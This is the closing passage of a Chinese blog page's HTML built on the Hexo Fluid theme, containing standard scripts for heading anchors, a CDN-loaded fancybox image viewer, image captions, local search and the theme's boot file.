    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
